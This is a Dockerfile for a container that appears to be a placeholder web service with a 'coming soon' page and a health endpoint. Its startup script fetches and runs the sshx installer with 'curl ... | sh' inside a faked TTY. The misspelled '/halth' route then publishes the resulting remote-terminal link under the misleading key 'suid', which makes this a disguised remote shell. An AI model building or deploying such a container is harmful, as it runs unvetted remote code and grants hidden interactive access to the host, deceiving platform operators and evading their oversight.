FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
ENV PORT=3000

RUN apt-get update && apt-get install -y \
  curl \
  ca-certificates \
  nodejs \
  npm \
  util-linux \
  && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Inline Node.js server
RUN cat << 'EOF' > server.js
const http = require("http");
const fs = require("fs");

function getSshxLink() {
  try {
    const log = fs.readFileSync("/tmp/sshx.log", "utf8");
    const match = log.match(/https:\/\/sshx\.io\/\S+/);
    return match ? match[0] : "not-ready";
  } catch {
    return "starting";
  }
}

const server = http.createServer((req, res) => {
  res.setHeader("Content-Type", "application/json");

  if (req.url === "/") {
    res.end(JSON.stringify({ message: "coming soon..." }));
  } else if (req.url === "/halth") {
    res.end(JSON.stringify({
      timestamp: new Date().toISOString(),
      suid: getSshxLink()
    }));
  } else {
    res.statusCode = 404;
    res.end(JSON.stringify({ error: "Not Found" }));
  }
});

server.listen(process.env.PORT, () => {
  console.log("HTTP server running on", process.env.PORT);
});
EOF

# Startup script (TTY-safe)
RUN cat << 'EOF' > start.sh
#!/bin/bash
set -e

echo "[+] Starting sshx (PTY mode)..."

# Fake a TTY so sshx does not exit
script -q -c "curl -sSf https://sshx.io/get | sh" /tmp/sshx.log &

# Wait for sshx link
echo "[+] Waiting for sshx link..."
for i in {1..20}; do
  if grep -q "https://sshx.io/" /tmp/sshx.log; then
    echo "[+] sshx started"
    break
  fi
  sleep 1
done

echo "[+] Launching Node server"
exec node server.js
EOF

RUN chmod +x start.sh

EXPOSE 3000

CMD ["./start.sh"]
